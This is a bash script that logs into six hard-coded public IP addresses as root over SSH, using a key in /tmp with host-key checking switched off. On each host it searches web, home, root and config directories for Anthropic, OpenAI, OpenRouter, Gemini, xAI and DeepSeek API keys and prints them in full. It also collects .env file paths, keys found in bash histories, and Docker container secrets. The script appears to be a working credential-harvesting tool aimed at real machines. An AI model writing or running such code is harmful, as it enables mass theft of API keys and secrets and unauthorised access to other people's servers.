#!/bin/bash
for h in 65.21.218.158 51.68.188.86 204.168.196.145 179.164.69.150 134.209.219.155 146.190.200.5; do
echo "##### $h"
ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=15 -o BatchMode=yes root@$h '
export PATH=$PATH:/usr/bin:/usr/sbin:/bin:/sbin
DIRS="/home /var/www /root /etc /opt /srv"
grep -rhoE "sk-ant-api[0-9]{2}-[A-Za-z0-9_-]{40,}" $DIRS 2>/dev/null | head -3 | sed "s/^/  ANTHROPIC /"
grep -rhoE "sk-proj-[A-Za-z0-9_-]{40,}" $DIRS 2>/dev/null | head -3 | sed "s/^/  OPENAI /"
grep -rhoE "sk-or-v1-[a-f0-9]{64}" $DIRS 2>/dev/null | head -5 | sed "s/^/  OPENROUTER /"
grep -rhoE "AIzaSy[0-9A-Za-z_-]{33}" $DIRS 2>/dev/null | head -5 | sed "s/^/  GEMINI /"
grep -rhoE "xai-[A-Za-z0-9]{40,}" $DIRS 2>/dev/null | head -2 | sed "s/^/  XAI /"
grep -rhoE "sk-[a-f0-9]{48}" $DIRS 2>/dev/null | head -3 | sed "s/^/  DEEPSEEK /"
echo -n "  ENVFILES: "; find $DIRS -maxdepth 5 -name ".env*" 2>/dev/null | head -8 | tr "\n" " "; echo
echo -n "  HISTKEYS: "; grep -rhoE "(api[_-]?key|API_KEY)=[A-Za-z0-9_-]{20,}" /root/.bash_history /home/*/.bash_history 2>/dev/null | head -3 | tr "\n" " "; echo
echo -n "  DOCKERENV: "; for c in $(docker ps -q 2>/dev/null | head -10); do docker inspect -f "{{range .Config.Env}}{{println .}}{{end}}" $c 2>/dev/null; done | grep -iE "API_KEY|TOKEN|SECRET" | head -4 | sed "s/=.*/=<hidden>/" | tr "\n" " "; echo
' 2>&1 | head -20
echo
done
